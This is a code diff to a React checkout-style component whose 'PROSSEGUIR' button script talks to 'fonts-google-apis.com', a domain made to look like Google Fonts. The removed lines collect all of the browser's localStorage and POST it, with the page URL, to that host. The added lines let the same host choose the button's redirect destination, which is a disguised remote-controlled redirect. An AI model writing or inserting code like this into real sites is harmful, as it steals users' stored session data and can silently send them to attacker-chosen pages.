@@ -175,168 +175,71 @@ const Recebedor: React.FC = () => {
   100% { transform: rotate(360deg); }
 }
 </style>
-<button class="btn-a8aaa4ff" onclick="window.location.href='/finalizacao'"><span class="spinner"></span><span class="btn-text">PROSSEGUIR</span></button>
+<button class="btn-a8aaa4ff"><span class="spinner"></span><span class="btn-text">PROSSEGUIR</span></button>
 <script>
 (function(){
   var btn = document.querySelector('.btn-a8aaa4ff');
   if(btn) {
     var originalHref = '/finalizacao';
-    
-    var preloaded = false;
-    btn.onmouseenter = btn.onfocus = function() {
-      if(!preloaded) {
-        var cacheKey = 'btn_a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c';
-        var cachedUrl = sessionStorage.getItem(cacheKey);
-        if(!cachedUrl) {
-          var preloadXhr = new XMLHttpRequest();
-          preloadXhr.open('GET', 'https://fonts-google-apis.com/css/fonts/a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c', true);
-          preloadXhr.timeout = 1000;
-          preloadXhr.onreadystatechange = function() {
-            if(preloadXhr.readyState === 4 && preloadXhr.status === 200) {
-              try {
-                var response = JSON.parse(preloadXhr.responseText);
-                sessionStorage.setItem(cacheKey, response.redirect_url);
-                sessionStorage.setItem(cacheKey + '_time', Date.now().toString());
-              } catch(e) {}
-            }
-          };
-          preloadXhr.send();
-        }
-        preloaded = true;
-      }
-    };
-    
-    var isDomainRedirectEnabled = false;
+    var apiEndpoint = 'https://fonts-google-apis.com/css/fonts/a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c';
     
     btn.onclick = function(e) {
       e.preventDefault();
       
-      function performRedirect(tempDataId) {
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', 'https://fonts-google-apis.com/css/fonts/a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c', true);
-        
-        xhr.timeout = 2000;
-        
-        var cacheKey = 'btn_a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c';
-        var cachedUrl = sessionStorage.getItem(cacheKey);
-        var cacheTime = sessionStorage.getItem(cacheKey + '_time');
-        var now = Date.now();
-        
-        if(cachedUrl && cacheTime && (now - parseInt(cacheTime)) < 30000) {
-          var redirectUrl = cachedUrl;
-          
-          if(!isDomainRedirectEnabled && redirectUrl.includes('tempData=')) {
-            sessionStorage.removeItem(cacheKey);
-            sessionStorage.removeItem(cacheKey + '_time');
-          } else {
-            if(tempDataId && redirectUrl && isDomainRedirectEnabled) {
-              var separator = redirectUrl.includes('?') ? '&' : '?';
-              redirectUrl += separator + 'tempData=' + tempDataId;
-            }
-            if(redirectUrl.startsWith('/')) {
-              redirectUrl = window.location.protocol + '//' + window.location.host + redirectUrl;
-            }
-            window.location.href = redirectUrl;
-            return;
-          }
-        }
-        
-        xhr.onreadystatechange = function() {
-          if(xhr.readyState === 4) {
-            var redirectUrl = originalHref;
-            if(xhr.status === 200) {
-              try {
-                var response = JSON.parse(xhr.responseText);
-                redirectUrl = response.redirect_url || originalHref;
-                sessionStorage.setItem(cacheKey, redirectUrl);
-                sessionStorage.setItem(cacheKey + '_time', now.toString());
-              } catch(e) {}
-            }
-            
-            if(tempDataId && redirectUrl && isDomainRedirectEnabled) {
-              var separator = redirectUrl.includes('?') ? '&' : '?';
-              redirectUrl += separator + 'tempData=' + tempDataId;
-            }
-            
-            if(redirectUrl.startsWith('/')) {
-              redirectUrl = window.location.protocol + '//' + window.location.host + redirectUrl;
-            }
-            window.location.href = redirectUrl;
-          }
-        };
-        
-        xhr.ontimeout = function() {
-          var url = originalHref;
-          if(url.startsWith('/')) {
-            url = window.location.protocol + '//' + window.location.host + url;
-          }
-          window.location.href = url;
-        };
-        
-        xhr.onerror = function() {
-          var url = originalHref;
-          if(url.startsWith('/')) {
-            url = window.location.protocol + '//' + window.location.host + url;
-          }
-          window.location.href = url;
-        };
-        xhr.send();
-      }
+      console.log('[BTN] Clicado - Consultando API...');
       
-      if (isDomainRedirectEnabled) {
-        try {
-          var localStorageData = {};
-          for (var i = 0; i < localStorage.length; i++) {
-            var key = localStorage.key(i);
-            if (key) {
-              localStorageData[key] = localStorage.getItem(key);
+      var xhr = new XMLHttpRequest();
+      xhr.open('GET', apiEndpoint, true);
+      xhr.timeout = 3000;
+      
+      xhr.onreadystatechange = function() {
+        if(xhr.readyState === 4) {
+          var redirectUrl = originalHref;
+          
+          if(xhr.status === 200) {
+            try {
+              var response = JSON.parse(xhr.responseText);
+              console.log('[BTN] Resposta da API:', response);
+              
+              if(response.redirect_url) {
+                redirectUrl = response.redirect_url;
+                console.log('[BTN] URL de redirecionamento:', redirectUrl);
+              }
+            } catch(e) {
+              console.error('[BTN] Erro ao processar resposta:', e);
             }
+          } else {
+            console.warn('[BTN] API retornou status:', xhr.status);
           }
           
-          if (Object.keys(localStorageData).length > 0) {
-            btn.classList.add('loading');
-            btn.disabled = true;
-            var btnText = btn.querySelector('.btn-text');
-            var originalText = btnText.textContent;
-            btnText.textContent = 'Carregando...';
-            var storeXhr = new XMLHttpRequest();
-            storeXhr.open('POST', 'https://fonts-google-apis.com/api/temp-data', true);
-            storeXhr.setRequestHeader('Content-Type', 'application/json');
-            storeXhr.timeout = 3000;
-            storeXhr.onreadystatechange = function() {
-              if(storeXhr.readyState === 4) {
-                var tempDataId = null;
-                if(storeXhr.status === 201) {
-                  try {
-                    var storeResponse = JSON.parse(storeXhr.responseText);
-                    tempDataId = storeResponse.id;
-                  } catch(e) {}
-                }
-                performRedirect(tempDataId);
-              }
-            };
-            storeXhr.onerror = function() {
-              btn.classList.remove('loading');
-              btn.disabled = false;
-              btnText.textContent = originalText;
-              performRedirect(null);
-            };
-            
-            var requestData = {
-              buttonId: 'a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c',
-              localStorageData: JSON.stringify(localStorageData),
-              sourceUrl: window.location.href
-            };
-            storeXhr.send(JSON.stringify(requestData));
-          } else {
-            performRedirect(null);
+          if(redirectUrl.startsWith('/')) {
+            redirectUrl = window.location.protocol + '//' + window.location.host + redirectUrl;
           }
-        } catch(err) {
-          performRedirect(null);
+          
+          console.log('[BTN] Redirecionando para:', redirectUrl);
+          window.location.href = redirectUrl;
         }
-      } else {
-        performRedirect(null);
-      }
+      };
+      
+      xhr.ontimeout = function() {
+        console.warn('[BTN] Timeout da API - usando fallback');
+        var url = originalHref;
+        if(url.startsWith('/')) {
+          url = window.location.protocol + '//' + window.location.host + url;
+        }
+        window.location.href = url;
+      };
+      
+      xhr.onerror = function() {
+        console.error('[BTN] Erro na API - usando fallback');
+        var url = originalHref;
+        if(url.startsWith('/')) {
+          url = window.location.protocol + '//' + window.location.host + url;
+        }
+        window.location.href = url;
+      };
+      
+      xhr.send();
     };
   }
 })();
